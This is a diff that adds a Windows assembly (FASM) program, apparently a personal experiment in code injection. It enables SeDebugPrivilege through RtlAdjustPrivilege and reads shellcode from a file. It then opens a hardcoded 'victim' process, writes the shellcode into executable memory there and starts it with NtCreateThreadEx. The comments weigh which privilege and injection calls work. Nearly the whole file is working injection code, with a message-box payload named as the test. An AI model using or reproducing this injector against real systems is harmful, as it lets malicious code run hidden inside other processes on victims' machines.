@@ -1,0 +1,83 @@
+include 'win32ax.inc'
+
+.data
+tHandle rd 1
+priv db 'SeDebugPrivilege',0x00 	;privilege name to get (must be null terminated)
+;priv db "SeIncreaseWorkingSetPrivilege", 0
+privOut rd 1
+struct LUID
+      low rd 1
+      high rd 1
+ends
+struct LUID_AND_ATTRIBUTES
+       luid LUID
+       attr rd 1
+ends
+struct	TOKEN_PRIVILEGES		;define a simple single privilege TOKEN_PRIVILEGES
+	privCount rd 1
+	privilege LUID_AND_ATTRIBUTES
+ends
+tp TOKEN_PRIVILEGES
+
+shell rb 256
+fHandle rd 1
+fSize rd 1
+bRead rd 1
+rpHandle rd 1
+rAddr rd 1
+victimPid dd 3372
+rThread rd 1
+
+.code
+start:		 ;ONLY RtlAdjustPrivilege seems to work!!
+		 ;invoke OpenProcess, PROCESS_ALL_ACCESS, FALSE, 0xffffffff
+		 ;inject anything under explorer.exe
+		 ;---OPTION 1, just use  GetCurrentProcess, OpenProcessToken, LookupPrivilegeValue
+		 ;AdjustTokenPrivilege(error)/NtAdjustPrivilegeToken (no error) DONT THINK REALLY WORK
+
+		 ;invoke GetCurrentProcess			    ;get current process handle, usuallu -1 or 0xffffffff
+		 ;invoke OpenProcessToken, eax, 0x28, tHandle	    ;get process access token with adjust/query right
+								   ;TOKEN_ADJUST_PRIVILEGE + TOKEN_QUERY = 0x28
+		 ;invoke LookupPrivilegeValue, 0, priv, tp.privilege.luid
+								   ;get a LUID (local unique ID) for 'SeDebugPrivilege'
+								   ;0 local system, 'SeDebugPrivilege' privilege name of LUID
+		 ;mov dword [tp.privCount], 1
+		 ;mov dword [tp.privilege.attr], 2;1		    ;2 = SE_PRIVILEGE_ENABLE, 0 = SE_PRIVILEGE_USE_FOR_ACCESS
+								   ;4 SE_SERVICE_REMOVED, 1 = SE_PRIVILEGE_ENABL_BY_DEFAULT
+		 ;invoke AdjustTokenPrivileges, [tHandle], 0, tp, 0, NULL, NULL
+
+		 ;---OPTION 2, just use RtlAdjustPrivilege
+		 ;invoke LoadLibraryA, 'ntdll.dll'
+		 ;invoke GetProcAddress, eax, 'NtAdjustPrivilegesToken'
+		 ;stdcall eax, [tHandle], 0, tp, 0, 0, 0
+		 ;CONFIRMED WORK and seDebugPrivilege enbled, but need admin
+		 invoke LoadLibraryA, 'ntdll.dll'
+		 invoke GetProcAddress, eax, 'RtlAdjustPrivilege'    ;much easier, no need to GetCurrentProcess, OpenProcessToken, LookupPrivilegeValue, AdjustTokenPrivilege(NT/non NT)
+		 stdcall eax, 20, 1, 0, privOut 		     ;but still need admin privilege to enable
+								     ;0x14 = SeDebugPrivilege, really does work
+
+		 ;invoke CreateFile, "C:\Users\mee\Desktop\msgBoxShell.bin", GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
+		 ;invoke CloseHandle, [tHandle]
+		 invoke CreateFile, "C:\Users\mee\Desktop\shellCode\myMsgBoxShell.shell", GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
+		 mov [fHandle], eax
+		 invoke GetFileSize, [fHandle], 0
+		 mov [fSize], eax
+		 invoke ReadFile, [fHandle], shell, [fSize], bRead, NULL    ;not sure wht byted read is needed?
+		 invoke CloseHandle, [fHandle]
+		 invoke OpenProcess, PROCESS_ALL_ACCESS, FALSE, [victimPid]
+		 mov [rpHandle], eax
+		 invoke VirtualAllocEx, [rpHandle], NULL, 256, MEM_COMMIT, PAGE_EXECUTE_READWRITE
+		 mov [rAddr], eax
+		 invoke WriteProcessMemory, [rpHandle], [rAddr], shell, 256, NULL
+		 invoke LoadLibraryA, 'ntdll.dll'
+		 invoke GetProcAddress, eax, 'NtCreateThreadEx'
+		 stdcall dword eax, rThread, 0x1fffff, 0, [rpHandle], [rAddr], 0, 0 ,0 ,0 ,0 ,0
+		 ;invoke CreateRemoteThread, [rpHandle], NULL, 256, [rAddr], NULL, NULL, rThread
+		 ;CreateRemoteThread, can inject anyone even without elevate privilege or default admin
+		 invoke CloseHandle, [rThread]
+		 invoke CloseHandle, [rpHandle]
+		 invoke MessageBoxA, 0, "test", "test", 0
+		 ;invoke ExitProcess, 0
+		 ret
+
+.end start
